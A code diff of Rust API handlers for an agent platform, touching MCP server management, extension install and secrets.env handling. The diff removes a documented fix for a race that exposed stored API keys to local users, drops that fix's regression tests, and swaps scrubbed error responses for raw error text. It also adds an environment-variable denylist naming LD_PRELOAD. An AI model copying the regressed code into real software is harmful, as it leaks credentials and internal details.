@@ -3773,11 +3188,11 @@ pub async fn hand_send_message(
     let result = if is_ephemeral {
         state
             .kernel
-            .send_message_ephemeral(agent_id, &effective_message, None)
+            .send_message_ephemeral(agent_id, &effective_message)
             .await
     } else {
-        let kernel_handle: Arc<dyn librefang_kernel::kernel_handle::KernelHandle> =
-            state.kernel.clone() as Arc<dyn librefang_kernel::kernel_handle::KernelHandle>;
+        let kernel_handle: Arc<dyn librefang_runtime::kernel_handle::KernelHandle> =
+            state.kernel.clone() as Arc<dyn librefang_runtime::kernel_handle::KernelHandle>;
         state
             .kernel
             .send_message_with_handle(agent_id, &effective_message, Some(kernel_handle))
@@ -3811,16 +3226,12 @@ pub async fn hand_send_message(
                     memory_conflicts: result.memory_conflicts,
                     thinking: None,
                     owner_notice: result.owner_notice,
-                    // Hands do not surface an auto-pinnable session id via
-                    // this body (#5199 is dashboard-chat-only). Field
-                    // omitted when None via `skip_serializing_if`.
-                    session_id: None,
                 })),
             )
         }
         Err(e) => {
             tracing::warn!("hand_send_message failed for instance {id}: {e}");
-            ApiErrorResponse::internal_scrub(e).into_json_tuple()
+            ApiErrorResponse::internal(format!("Message delivery failed: {e}")).into_json_tuple()
         }
     }
 }
@@ -3922,7 +3333,9 @@ pub async fn hand_get_session(
             )
         }
         Ok(None) => (StatusCode::OK, Json(serde_json::json!({ "messages": [] }))),
-        Err(e) => ApiErrorResponse::internal_scrub(e).into_json_tuple(),
+        Err(e) => {
+            ApiErrorResponse::internal(format!("Failed to load session: {e}")).into_json_tuple()
+        }
     }
 }
 
@@ -4180,7 +3593,7 @@ pub async fn list_mcp_servers(State(state): State<Arc<AppState>>) -> impl IntoRe
                 .collect();
             let is_alive = matches!(
                 health.get_health(conn.name()).map(|h| h.status),
-                Some(librefang_types::mcp::McpStatus::Ready),
+                Some(librefang_extensions::McpStatus::Ready),
             );
             serde_json::json!({
                 "name": conn.name(),
@@ -4316,7 +3729,11 @@ pub async fn add_mcp_server(
             })
             .unwrap_or_default();
 
-        let catalog = state.kernel.mcp_catalog_load();
+        let catalog = state
+            .kernel
+            .mcp_catalog()
+            .read()
+            .unwrap_or_else(|e| e.into_inner());
         let entry = match catalog.get(&tid) {
             Some(e) => e.clone(),
             None => {
@@ -4345,9 +3762,32 @@ pub async fn add_mcp_server(
             .into_json_tuple();
         }
 
-        // Route through the kernel facade: cached vault (no per-request
-        // Argon2id KDF) + cached catalog snapshot (#3598).
-        let result = match state.kernel.install_integration(&entry.id, &creds) {
+        // Credential resolver: dotenv + vault (if unlocked)
+        let home = state.kernel.home_dir().to_path_buf();
+        let dotenv_path = home.join(".env");
+        let vault_path = home.join("vault.enc");
+        let vault = if vault_path.exists() {
+            let mut v = librefang_extensions::vault::CredentialVault::new(vault_path);
+            if v.unlock().is_ok() {
+                Some(v)
+            } else {
+                None
+            }
+        } else {
+            None
+        };
+        let mut resolver =
+            librefang_extensions::credentials::CredentialResolver::new(vault, Some(&dotenv_path));
+
+        // Ephemeral catalog to feed the installer (it takes &McpCatalog).
+        let mut cat = librefang_extensions::catalog::McpCatalog::new(&home);
+        cat.load(&home);
+        let result = match librefang_extensions::installer::install_integration(
+            &cat,
+            &mut resolver,
+            &entry.id,
+            &creds,
+        ) {
             Ok(r) => r,
             Err(e) => {
                 return ApiErrorResponse::bad_request(format!("Install failed: {e}"))
@@ -4397,7 +3837,8 @@ pub async fn add_mcp_server(
     // Persist to config.toml
     let config_path = state.kernel.home_dir().join("config.toml");
     if let Err(e) = upsert_mcp_server_config(&config_path, &entry) {
-        return ApiErrorResponse::internal_scrub(e).into_json_tuple();
+        return ApiErrorResponse::internal(format!("Failed to write config: {e}"))
+            .into_json_tuple();
     }
 
     // Trigger config reload
@@ -4413,19 +3854,12 @@ pub async fn add_mcp_server(
     };
 
     // Establish connection to the newly added server in the background.
-    // Wrap in `spawn_supervised` so a panic inside `connect_mcp_servers`
-    // (e.g. parse failure, OAuth handshake, tool list deserialization) is
-    // logged at `error!` rather than silently aborting the detached task
-    // and leaving the new server stuck in a half-connecting state.
     let kernel = std::sync::Arc::clone(&state.kernel);
-    librefang_kernel::supervised_spawn::spawn_supervised(
-        "connect_mcp_servers_after_add",
-        async move { kernel.connect_mcp_servers().await },
-    );
+    tokio::spawn(async move { kernel.connect_mcp_servers().await });
 
     state.kernel.audit().record(
         "system",
-        librefang_kernel::audit::AuditAction::ConfigChange,
+        librefang_runtime::audit::AuditAction::ConfigChange,
         format!("mcp_server added: {name}"),
         "completed",
     );
@@ -4527,14 +3961,11 @@ pub async fn update_mcp_server(
     // Disconnect the old connection so connect_mcp_servers picks up the new config.
     state.kernel.disconnect_mcp_server(&name).await;
     let kernel = std::sync::Arc::clone(&state.kernel);
-    librefang_kernel::supervised_spawn::spawn_supervised(
-        "connect_mcp_servers_after_update",
-        async move { kernel.connect_mcp_servers().await },
-    );
+    tokio::spawn(async move { kernel.connect_mcp_servers().await });
 
     state.kernel.audit().record(
         "system",
-        librefang_kernel::audit::AuditAction::ConfigChange,
+        librefang_runtime::audit::AuditAction::ConfigChange,
         format!("mcp_server updated: {name}"),
         "completed",
     );
@@ -4561,7 +3992,6 @@ pub async fn update_mcp_server(
 // `serde_json::Value` for the body schema, which keeps the spec accurate
 // without forcing a downstream derive.
 #[derive(serde::Deserialize)]
-#[serde(deny_unknown_fields)]
 pub(crate) struct PatchMcpTaintRequest {
     /// When supplied, replaces `taint_scanning` on the existing entry.
     #[serde(default)]
@@ -4648,14 +4078,11 @@ pub async fn patch_mcp_server_taint(
     // already updates via `reload_config` without a reconnect.
     state.kernel.disconnect_mcp_server(&name).await;
     let kernel = std::sync::Arc::clone(&state.kernel);
-    librefang_kernel::supervised_spawn::spawn_supervised(
-        "connect_mcp_servers_after_taint_patch",
-        async move { kernel.connect_mcp_servers().await },
-    );
+    tokio::spawn(async move { kernel.connect_mcp_servers().await });
 
     state.kernel.audit().record(
         "system",
-        librefang_kernel::audit::AuditAction::ConfigChange,
+        librefang_runtime::audit::AuditAction::ConfigChange,
         format!("mcp_server taint updated: {name}"),
         "completed",
     );
@@ -4784,7 +4211,7 @@ pub async fn delete_mcp_server(
 
     state.kernel.audit().record(
         "system",
-        librefang_kernel::audit::AuditAction::ConfigChange,
+        librefang_runtime::audit::AuditAction::ConfigChange,
         format!("mcp_server removed: {name}"),
         "completed",
     );
@@ -5215,7 +4642,8 @@ pub async fn get_supporting_file(
     let content = match std::fs::read_to_string(&canonical) {
         Ok(s) => s,
         Err(e) => {
-            return ApiErrorResponse::internal_scrub(e).into_json_tuple();
+            return ApiErrorResponse::internal(format!("Failed to read file: {e}"))
+                .into_json_tuple();
         }
     };
     let (truncated, body) = if content.len() > MAX_BYTES {
@@ -5249,7 +4677,7 @@ fn audit_evolve(state: &Arc<AppState>, action: &str, skill_name: &str, detail: &
         // Dashboard calls don't have an agent_id — use a distinctive
         // actor so audit readers can tell user actions from agent ones.
         "dashboard".to_string(),
-        librefang_kernel::audit::AuditAction::AgentMessage,
+        librefang_runtime::audit::AuditAction::AgentMessage,
         format!("skill_evolve:{action}:{skill_name}"),
         detail.to_string(),
     );
@@ -5507,6 +4935,69 @@ pub async fn evolve_remove_file(
 
 // ── Helper functions for secrets.env management ────────────────────────
 
+/// Denylist of critical system environment variables that must not be overwritten.
+const DENIED_ENV_VARS: &[&str] = &[
+    "PATH",
+    "HOME",
+    "USER",
+    "SHELL",
+    "LD_PRELOAD",
+    "LD_LIBRARY_PATH",
+    "DYLD_LIBRARY_PATH",
+    "DYLD_INSERT_LIBRARIES",
+    "TERM",
+    "LANG",
+    "PWD",
+];
+
+/// Maximum allowed length for an environment variable value.
+const ENV_VALUE_MAX_LEN: usize = 4096;
+
+/// Validate an environment variable name and value before setting them.
+///
+/// Rules:
+/// - Name must match `^[A-Za-z_][A-Za-z0-9_]*$`
+/// - Name must not be in the system denylist
+/// - Value length must not exceed [`ENV_VALUE_MAX_LEN`]
+pub(crate) fn validate_env_var(name: &str, value: &str) -> Result<(), String> {
+    // Check name format: must start with letter or underscore, then alphanumeric/underscore
+    if name.is_empty() {
+        return Err("Environment variable name must not be empty".to_string());
+    }
+    let first = name.as_bytes()[0];
+    if !(first.is_ascii_alphabetic() || first == b'_') {
+        return Err(format!(
+            "Environment variable name '{}' must start with a letter or underscore",
+            name
+        ));
+    }
+    if !name.bytes().all(|b| b.is_ascii_alphanumeric() || b == b'_') {
+        return Err(format!(
+            "Environment variable name '{}' contains invalid characters (only A-Z, a-z, 0-9, _ allowed)",
+            name
+        ));
+    }
+
+    // Check denylist
+    let upper = name.to_ascii_uppercase();
+    if DENIED_ENV_VARS.iter().any(|&d| d == upper) {
+        return Err(format!(
+            "Environment variable '{}' is a protected system variable and cannot be overwritten",
+            name
+        ));
+    }
+
+    // Check value length
+    if value.len() > ENV_VALUE_MAX_LEN {
+        return Err(format!(
+            "Environment variable value exceeds maximum length of {} bytes",
+            ENV_VALUE_MAX_LEN
+        ));
+    }
+
+    Ok(())
+}
+
 /// Escape a value for safe storage in a `.env` file.
 ///
 /// If a value contains literal newlines the raw `KEY=value\nEXTRA=junk` text
@@ -5519,6 +5010,10 @@ fn escape_env_value(value: &str) -> String {
         .replace('\r', "\\r")
 }
 
+/// Write or update a key in the secrets.env file.
+/// File format: one `KEY=value` per line. Existing keys are overwritten.
+/// Values containing newlines or backslashes are escaped so they stay on a
+/// single line and round-trip correctly through dotenv parsers.
 pub(crate) fn write_secret_env(
     path: &std::path::Path,
     key: &str,
@@ -5560,25 +5055,18 @@ pub(crate) fn write_secret_env(
         std::fs::create_dir_all(parent)?;
     }
 
-    // Atomic mode-0600 write (audit: write-secret-env-toctou).
-    //
-    // Pre-fix the path was `fs::write` (opens at the process umask,
-    // typically `0644`) followed by `chmod 0600`. Between the
-    // write-syscall completion and the chmod-syscall completion any
-    // local user on the same host could `cat ~/.librefang/secrets.env`
-    // and read every provider API key the daemon has stored — the
-    // exact race `save_sessions` was hardened against in #3939 /
-    // #3725 (`server.rs:948-987` uses `OpenOptions::mode(0o600)` on a
-    // temp file then atomic-renames). The secrets-write path missed
-    // that rewrite; the TOCTOU window re-opened on every "save key"
-    // dashboard action.
-    //
-    // Pattern: create a sibling `.tmp` file with `0600` from the
-    // start, write the content, fsync, then atomic-rename onto the
-    // canonical path. `rename(2)` is atomic within a filesystem; the
-    // destination inode appears with `0600` already set, never at
-    // umask defaults.
-    atomic_write_secret_file(path, lines.join("\n") + "\n")
+    std::fs::write(path, lines.join("\n") + "\n")?;
+
+    // SECURITY: Restrict file permissions on Unix
+    #[cfg(unix)]
+    {
+        use std::os::unix::fs::PermissionsExt;
+        if let Err(e) = std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o600)) {
+            tracing::warn!("Failed to set file permissions: {e}");
+        }
+    }
+
+    Ok(())
 }
 
 /// Remove a key from the secrets.env file.
@@ -5595,85 +5083,127 @@ pub(crate) fn remove_secret_env(path: &std::path::Path, key: &str) -> Result<(),
         .map(|l| l.to_string())
         .collect();
 
-    // Same mode-0600 atomic-rename pattern as `write_secret_env`.
-    // `remove_secret_env` has the same TOCTOU window the audit
-    // calls out — a key removal still rewrites the whole file with
-    // every remaining key in plaintext.
-    atomic_write_secret_file(path, lines.join("\n") + "\n")
-}
+    std::fs::write(path, lines.join("\n") + "\n")?;
 
-/// Atomically replace `path` with `content`, ensuring the resulting
-/// inode is mode `0600` (Unix) from creation — never observable at
-/// the process umask. Writes to a sibling `.tmp` file first to keep
-/// the rename within the same filesystem (so `rename(2)` is
-/// atomic). On non-Unix targets the helper still uses the temp +
-/// rename shape so partial writes can't tear the file; the
-/// per-permissions bit is a no-op (Windows ACLs are inherited from
-/// the parent directory, which lives under the daemon-UID user
-/// profile).
-fn atomic_write_secret_file(path: &std::path::Path, content: String) -> Result<(), std::io::Error> {
-    use std::io::Write as _;
-    let parent = path.parent().unwrap_or_else(|| std::path::Path::new("."));
-    let file_name = path
-        .file_name()
-        .map(|n| n.to_owned())
-        .unwrap_or_else(|| std::ffi::OsString::from("secrets.env"));
-    let mut tmp_name = file_name;
-    tmp_name.push(".tmp");
-    let tmp_path = parent.join(tmp_name);
-
-    // Open with mode 0600 from the start on Unix. The temp file is
-    // discarded on any error path below so we don't leak a partial
-    // write on disk.
-    let mut opts = std::fs::OpenOptions::new();
-    opts.write(true).create(true).truncate(true);
-    #[cfg(unix)]
-    {
-        use std::os::unix::fs::OpenOptionsExt as _;
-        opts.mode(0o600);
-    }
-    let mut f = opts.open(&tmp_path)?;
-    f.write_all(content.as_bytes())?;
-    f.sync_all()?;
-    drop(f);
-
-    // `rename(2)` is atomic — the destination either contains the
-    // old bytes (pre-rename) or the new bytes (post-rename); a
-    // concurrent reader never observes a half-written file.
-    match std::fs::rename(&tmp_path, path) {
-        Ok(()) => Ok(()),
-        Err(e) => {
-            // Clean up the temp file so we don't accrete `*.tmp`
-            // litter on partial-failure paths.
-            let _ = std::fs::remove_file(&tmp_path);
-            Err(e)
-        }
-    }
+    Ok(())
 }
 
 // ── Config.toml channel management helpers ──────────────────────────
 
-// `CHANNEL_AOT_CONFLICT_PREFIX` was the sentinel-error prefix
-// `upsert_channel_config` / `remove_channel_config` returned when
-// the channel was in `[[channels.<name>]]` array-of-tables shape;
-// the handler matched on the prefix to map the failure to 409
-// Conflict. Both helpers + the sentinel are gone with the rest of
-// the in-process channel-config write path.
+/// Upsert a `[channels.<name>]` section in config.toml with the given non-secret fields.
+///
+/// Uses `toml_edit::DocumentMut` to preserve comments, key ordering, and
+/// formatting of unrelated sections (providers, agents, etc.). The previous
+/// `toml::Value` round-trip silently rewrote the entire file on every
+/// channel write — see issue #3183. Callers must hold
+/// `AppState::config_write_lock` to serialize against `POST /api/config/set`,
+/// which performs an asymmetric read-modify-write on the same file.
+pub(crate) fn upsert_channel_config(
+    config_path: &std::path::Path,
+    channel_name: &str,
+    fields: &HashMap<String, (String, FieldType)>,
+) -> Result<(), Box<dyn std::error::Error>> {
+    validate_static_file_path(config_path, "config.toml")
+        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;
+    let content = if config_path.exists() {
+        std::fs::read_to_string(config_path)?
+    } else {
+        String::new()
+    };
+
+    let mut doc: toml_edit::DocumentMut = if content.trim().is_empty() {
+        toml_edit::DocumentMut::new()
+    } else {
+        content.parse()?
+    };
+
+    // Ensure [channels] table exists
+    if !doc.contains_table("channels") {
+        doc["channels"] = toml_edit::Item::Table(toml_edit::Table::new());
+    }
+    let channels_table = doc["channels"]
+        .as_table_mut()
+        .ok_or("channels is not a table")?;
+
+    // Build channel sub-table with correct TOML types
+    let mut ch_table = toml_edit::Table::new();
+    for (k, (v, ft)) in fields {
+        let item = match ft {
+            FieldType::Number => {
+                if let Ok(n) = v.parse::<i64>() {
+                    toml_edit::value(n)
+                } else {
+                    toml_edit::value(v.clone())
+                }
+            }
+            FieldType::List => {
+                // Always store list items as strings so that numeric IDs
+                // (e.g. Discord guild snowflakes, Telegram user IDs) are
+                // deserialized correctly into Vec<String> config fields.
+                let mut arr = toml_edit::Array::new();
+                for s in v.split(',').map(|s| s.trim()).filter(|s| !s.is_empty()) {
+                    arr.push(s);
+                }
+                toml_edit::value(arr)
+            }
+            _ => toml_edit::value(v.clone()),
+        };
+        ch_table.insert(k, item);
+    }
+    channels_table.insert(channel_name, toml_edit::Item::Table(ch_table));
+
+    // Ensure parent directory exists
+    if let Some(parent) = config_path.parent() {
+        std::fs::create_dir_all(parent)?;
+    }
+
+    std::fs::write(config_path, doc.to_string())?;
+    Ok(())
+}
+
+/// Remove a `[channels.<name>]` section from config.toml.
+///
+/// Mirrors `upsert_channel_config`: format-preserving via `toml_edit`, and
+/// callers must hold `AppState::config_write_lock`.
+pub(crate) fn remove_channel_config(
+    config_path: &std::path::Path,
+    channel_name: &str,
+) -> Result<(), Box<dyn std::error::Error>> {
+    validate_static_file_path(config_path, "config.toml")
+        .map_err(|e| -> Box<dyn std::error::Error> { e.into() })?;
+    if !config_path.exists() {
+        return Ok(());
+    }
+
+    let content = std::fs::read_to_string(config_path)?;
+    if content.trim().is_empty() {
+        return Ok(());
+    }
+
+    let mut doc: toml_edit::DocumentMut = content.parse()?;
+
+    if let Some(channels) = doc.get_mut("channels").and_then(|i| i.as_table_mut()) {
+        channels.remove(channel_name);
+    }
+
+    std::fs::write(config_path, doc.to_string())?;
+    Ok(())
+}
 
 // ---------------------------------------------------------------------------
 // MCP catalog + reconnect + health + reload endpoints
 // ---------------------------------------------------------------------------
 
 /// Serialize a single catalog transport for API output.
-fn serialize_catalog_transport(t: &librefang_types::mcp::McpCatalogTransport) -> serde_json::Value {
+fn serialize_catalog_transport(t: &librefang_extensions::McpCatalogTransport) -> serde_json::Value {
     match t {
-        librefang_types::mcp::McpCatalogTransport::Stdio { command, args } => {
+        librefang_extensions::McpCatalogTransport::Stdio { command, args } => {
             serde_json::json!({ "type": "stdio", "command": command, "args": args })
         }
-        librefang_types::mcp::McpCatalogTransport::Sse { url } => {
+        librefang_extensions::McpCatalogTransport::Sse { url } => {
             serde_json::json!({ "type": "sse", "url": url })
         }
-        librefang_types::mcp::McpCatalogTransport::Http { url } => {
+        librefang_extensions::McpCatalogTransport::Http { url } => {
             serde_json::json!({ "type": "http", "url": url })
         }
     }
@@ -5697,7 +5227,7 @@ fn collect_installed_catalog_ids(state: &Arc<AppState>) -> std::collections::Has
 }
 
 fn render_catalog_entry(
-    entry: &librefang_types::mcp::McpCatalogEntry,
+    entry: &librefang_extensions::McpCatalogEntry,
     installed_template_ids: &std::collections::HashSet<String>,
     lang: &str,
 ) -> serde_json::Value {
@@ -5755,7 +5285,11 @@ pub async fn list_mcp_catalog(
     let lang = super::resolve_lang(lang.as_ref());
     let installed_ids = collect_installed_catalog_ids(&state);
 
-    let catalog = state.kernel.mcp_catalog_load();
+    let catalog = state
+        .kernel
+        .mcp_catalog()
+        .read()
+        .unwrap_or_else(|e| e.into_inner());
     let entries: Vec<serde_json::Value> = catalog
         .list()
         .iter()
@@ -5786,7 +5320,11 @@ pub async fn get_mcp_catalog_entry(
     let lang = super::resolve_lang(lang.as_ref());
     let installed_ids = collect_installed_catalog_ids(&state);
 
-    let catalog = state.kernel.mcp_catalog_load();
+    let catalog = state
+        .kernel
+        .mcp_catalog()
+        .read()
+        .unwrap_or_else(|e| e.into_inner());
     match catalog.get(&id) {
         Some(entry) => (
             StatusCode::OK,
@@ -5823,7 +5361,7 @@ pub async fn reconnect_mcp_server_handler(
             .into_json_tuple();
     }
 
-    match state.kernel.clone().reconnect_mcp_server(&name).await {
+    match state.kernel.reconnect_mcp_server(&name).await {
         Ok(tool_count) => (
             StatusCode::OK,
             Json(serde_json::json!({
@@ -5896,7 +5434,7 @@ pub async fn reload_mcp_handler(State(state): State<Arc<AppState>>) -> impl Into
         tracing::warn!("Failed to reload config before MCP reload: {e}");
     }
 
-    match state.kernel.clone().reload_mcp_servers().await {
+    match state.kernel.reload_mcp_servers().await {
         Ok(connected) => (
             StatusCode::OK,
             Json(serde_json::json!({
@@ -5936,8 +5474,8 @@ fn status_str_for_catalog(
 ) -> &'static str {
     match installed_by_template.get(template_id) {
         Some(srv) => match health.get_health(&srv.name).as_ref().map(|h| &h.status) {
-            Some(librefang_types::mcp::McpStatus::Ready) => "ready",
-            Some(librefang_types::mcp::McpStatus::Error(_)) => "error",
+            Some(librefang_extensions::McpStatus::Ready) => "ready",
+            Some(librefang_extensions::McpStatus::Error(_)) => "error",
             _ => "installed",
         },
         None => "available",
@@ -5958,7 +5496,11 @@ pub async fn list_extensions(State(state): State<Arc<AppState>>) -> impl IntoRes
     let installed_map = installed_servers_by_template(&cfg.mcp_servers);
     let health = state.kernel.mcp_health();
 
-    let catalog = state.kernel.mcp_catalog_load();
+    let catalog = state
+        .kernel
+        .mcp_catalog()
+        .read()
+        .unwrap_or_else(|e| e.into_inner());
 
     let mut extensions = Vec::new();
     for entry in catalog.list() {
@@ -6006,7 +5548,11 @@ pub async fn get_extension(
 ) -> impl IntoResponse {
     let cfg = state.kernel.config_snapshot();
     let installed_map = installed_servers_by_template(&cfg.mcp_servers);
-    let catalog = state.kernel.mcp_catalog_load();
+    let catalog = state
+        .kernel
+        .mcp_catalog()
+        .read()
+        .unwrap_or_else(|e| e.into_inner());
 
     let entry = match catalog.get(&name) {
         Some(t) => t.clone(),
@@ -6090,18 +5636,36 @@ pub async fn install_extension(
         );
     }
 
-    // Route through the kernel facade: cached vault + cached catalog (#3598).
-    let result = match state
-        .kernel
-        .install_integration(&name, &std::collections::HashMap::new())
-    {
+    // Reuse the installer via an ephemeral catalog load.
+    let home = state.kernel.home_dir().to_path_buf();
+    let dotenv_path = home.join(".env");
+    let vault_path = home.join("vault.enc");
+    let vault = if vault_path.exists() {
+        let mut v = librefang_extensions::vault::CredentialVault::new(vault_path);
+        if v.unlock().is_ok() {
+            Some(v)
+        } else {
+            None
+        }
+    } else {
+        None
+    };
+    let mut resolver =
+        librefang_extensions::credentials::CredentialResolver::new(vault, Some(&dotenv_path));
+    let mut catalog = librefang_extensions::catalog::McpCatalog::new(&home);
+    catalog.load(&home);
+
+    let result = match librefang_extensions::installer::install_integration(
+        &catalog,
+        &mut resolver,
+        &name,
+        &std::collections::HashMap::new(),
+    ) {
         Ok(r) => r,
         Err(e) => {
             let err_str = e.to_string();
             let status = match e {
-                librefang_types::integration::IntegrationError::NotFound(_) => {
-                    StatusCode::NOT_FOUND
-                }
+                librefang_extensions::ExtensionError::NotFound(_) => StatusCode::NOT_FOUND,
                 _ => StatusCode::INTERNAL_SERVER_ERROR,
             };
             return (status, Json(serde_json::json!({"error": err_str})));
@@ -6128,7 +5692,7 @@ pub async fn install_extension(
     }
 
     state.kernel.mcp_health().register(&result.server.name);
-    let connected = state.kernel.clone().reload_mcp_servers().await.unwrap_or(0);
+    let connected = state.kernel.reload_mcp_servers().await.unwrap_or(0);
 
     (
         StatusCode::OK,
@@ -6178,7 +5742,8 @@ pub async fn uninstall_extension(
 
     let config_path = state.kernel.home_dir().join("config.toml");
     if let Err(e) = remove_mcp_server_config(&config_path, &server_name) {
-        return ApiErrorResponse::internal_scrub(e).into_json_tuple();
+        return ApiErrorResponse::internal(format!("Failed to update config: {e}"))
+            .into_json_tuple();
     }
 
     // Sync the in-memory config before reload_mcp_servers runs. Otherwise
@@ -6191,7 +5756,7 @@ pub async fn uninstall_extension(
 
     state.kernel.mcp_health().unregister(&server_name);
     state.kernel.disconnect_mcp_server(&server_name).await;
-    if let Err(e) = state.kernel.clone().reload_mcp_servers().await {
+    if let Err(e) = state.kernel.reload_mcp_servers().await {
         tracing::warn!("Failed to reload MCP servers after uninstall: {e}");
     }
 
@@ -6345,11 +5910,123 @@ mod tests {
         }
     }
 
-    // 16 channel-config tests (upsert / remove / append / update /
-    // remove_channel_instance, AoT-conflict guards, legacy-table
-    // promotion) retired alongside the helper functions they
-    // exercised — every channel runs as a sidecar so the `[channels.<x>]`
-    // TOML write path has zero callers.
+    /// Regression for #3183: writing a channel section must not destroy
+    /// unrelated provider settings (or the user's comments and key order)
+    /// in `config.toml`. The previous `toml::Value` round-trip rebuilt the
+    /// entire document on every channel write, which dropped comments and
+    /// — combined with the missing `config_write_lock` — could clobber a
+    /// concurrent provider write from `POST /api/config/set`.
+    #[test]
+    fn upsert_channel_config_preserves_unrelated_sections_and_comments() {
+        let tmp = tempfile::tempdir().unwrap();
+        let config_path = tmp.path().join("config.toml");
+        let original = "\
+# Top-of-file comment that must survive channel writes
+api_port = 4545
+
+[providers.nim]
+# NVIDIA NIM provider — issue #3183 repro
+kind = \"openai-compat\"
+base_url = \"https://integrate.api.nvidia.com/v1\"
+api_key_env = \"NIM_API_KEY\"
+
+[channels.discord]
+bot_token_env = \"OLD_DISCORD_TOKEN\"
+";
+        std::fs::write(&config_path, original).unwrap();
+
+        let mut fields: HashMap<String, (String, FieldType)> = HashMap::new();
+        fields.insert(
+            "bot_token_env".to_string(),
+            ("DISCORD_BOT_TOKEN".to_string(), FieldType::Text),
+        );
+        fields.insert(
+            "guild_ids".to_string(),
+            ("123, 456".to_string(), FieldType::List),
+        );
+
+        upsert_channel_config(&config_path, "discord", &fields).expect("upsert should succeed");
+
+        let raw = std::fs::read_to_string(&config_path).unwrap();
+
+        // Provider section must be intact — this is the original bug.
+        assert!(
+            raw.contains("[providers.nim]"),
+            "[providers.nim] section was dropped — got:\n{raw}"
+        );
+        assert!(
+            raw.contains("base_url = \"https://integrate.api.nvidia.com/v1\""),
+            "NIM base_url was dropped — got:\n{raw}"
+        );
+
+        // Comments and the top-level scalar must survive the rewrite.
+        assert!(
+            raw.contains("# Top-of-file comment that must survive channel writes"),
+            "top-level comment was dropped — got:\n{raw}"
+        );
+        assert!(
+            raw.contains("# NVIDIA NIM provider"),
+            "in-section comment was dropped — got:\n{raw}"
+        );
+        assert!(
+            raw.contains("api_port = 4545"),
+            "top-level scalar was dropped — got:\n{raw}"
+        );
+
+        // The new channel fields must be written with correct TOML types
+        // (list of strings, not list of integers — see the FieldType::List
+        // comment about Discord guild snowflakes).
+        #[derive(serde::Deserialize)]
+        struct Discord {
+            bot_token_env: String,
+            guild_ids: Vec<String>,
+        }
+        #[derive(serde::Deserialize)]
+        struct Channels {
+            discord: Discord,
+        }
+        #[derive(serde::Deserialize)]
+        struct Wrapper {
+            channels: Channels,
+        }
+        let parsed: Wrapper = toml::from_str(&raw).expect("config must round-trip");
+        assert_eq!(parsed.channels.discord.bot_token_env, "DISCORD_BOT_TOKEN");
+        assert_eq!(parsed.channels.discord.guild_ids, vec!["123", "456"]);
+    }
+
+    /// Companion to the upsert test: removing a channel must also leave
+    /// every other section untouched.
+    #[test]
+    fn remove_channel_config_preserves_unrelated_sections_and_comments() {
+        let tmp = tempfile::tempdir().unwrap();
+        let config_path = tmp.path().join("config.toml");
+        let original = "\
+# keep me
+[providers.nim]
+kind = \"openai-compat\"
+base_url = \"https://integrate.api.nvidia.com/v1\"
+
+[channels.discord]
+bot_token_env = \"DISCORD_BOT_TOKEN\"
+";
+        std::fs::write(&config_path, original).unwrap();
+
+        remove_channel_config(&config_path, "discord").expect("remove should succeed");
+
+        let raw = std::fs::read_to_string(&config_path).unwrap();
+        assert!(
+            raw.contains("[providers.nim]"),
+            "[providers.nim] was dropped — got:\n{raw}"
+        );
+        assert!(
+            raw.contains("# keep me"),
+            "top-level comment was dropped — got:\n{raw}"
+        );
+        assert!(
+            !raw.contains("[channels.discord]"),
+            "channel section should have been removed — got:\n{raw}"
+        );
+    }
 
     // ── escape_env_value tests (Bug #3790) ─────────────────────────────────
 
@@ -6394,66 +6071,6 @@ mod tests {
         assert!(!escaped.contains('\n'));
     }
 
-    /// Regression for audit `write-secret-env-toctou`. After a
-    /// successful `write_secret_env`, the resulting file must be
-    /// mode `0o600` from the moment it appears on disk — the
-    /// atomic-rename pattern guarantees the file never exists
-    /// readable-to-other-UIDs even for one syscall.
-    #[cfg(unix)]
-    #[test]
-    fn write_secret_env_yields_mode_0600() {
-        use std::os::unix::fs::PermissionsExt as _;
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("secrets.env");
-        write_secret_env(&path, "ANTHROPIC_API_KEY", "sk-secret-123").unwrap();
-        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
-        assert_eq!(
-            mode, 0o600,
-            "secrets.env must be 0o600 immediately after write; got {mode:o}",
-        );
-    }
-
-    /// `remove_secret_env` rewrites the whole file with every
-    /// remaining key — the audit's TOCTOU window applies equally
-    /// to this path, so the post-condition mode must also be 0600.
-    #[cfg(unix)]
-    #[test]
-    fn remove_secret_env_yields_mode_0600() {
-        use std::os::unix::fs::PermissionsExt as _;
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("secrets.env");
-        write_secret_env(&path, "A", "1").unwrap();
-        write_secret_env(&path, "B", "2").unwrap();
-        // Deliberately clobber the mode to 0644 (the umask default
-        // the pre-fix code left in the window) so the assertion
-        // below proves the post-condition is restored, not just
-        // inherited from the prior write.
-        std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
-        remove_secret_env(&path, "A").unwrap();
-        let mode = std::fs::metadata(&path).unwrap().permissions().mode() & 0o777;
-        assert_eq!(
-            mode, 0o600,
-            "remove_secret_env must restore 0o600 on rewrite; got {mode:o}",
-        );
-    }
-
-    /// The atomic-rename `*.tmp` sibling must not survive a
-    /// successful write. Leaving the temp file would (a) accrete
-    /// litter under `~/.librefang/` and (b) leave the previous
-    /// secret value readable from the `.tmp` inode until the next
-    /// write overwrites it.
-    #[test]
-    fn write_secret_env_cleans_up_tmp_file() {
-        let tmp = tempfile::tempdir().unwrap();
-        let path = tmp.path().join("secrets.env");
-        write_secret_env(&path, "OPENAI_API_KEY", "sk-1").unwrap();
-        let tmp_path = path.with_file_name("secrets.env.tmp");
-        assert!(
-            !tmp_path.exists(),
-            "tmp sibling must be gone after atomic rename completes",
-        );
-    }
-
     #[test]
     fn write_secret_env_value_with_newline_is_rejected() {
         // Implementation tightened to reject newlines in the value rather
@@ -6461,8 +6078,7 @@ mod tests {
         // (see this test's previous name) but it left a real injection
         // surface for callers that didn't expect dotenv parsers to honour
         // backslash sequences.  Now we fail-closed: caller must sanitise
-        // before passing. (`write_service_account_env` was folded into the
-        // generic `write_secret_env` when google_chat/webhook moved out.)
+        // before passing.
         let tmp = tempfile::tempdir().unwrap();
         let path = tmp.path().join("secrets.env");
         let err = write_secret_env(&path, "API_KEY", "val\nwith\nnewlines").unwrap_err();
@@ -6476,254 +6092,5 @@ mod tests {
             !path.exists(),
             "secrets.env must not be created on validation error"
         );
-    }
-}
-
-#[cfg(test)]
-mod skill_identifier_validation {
-    //! Regression guards for the `skill-install-path-traversal` audit
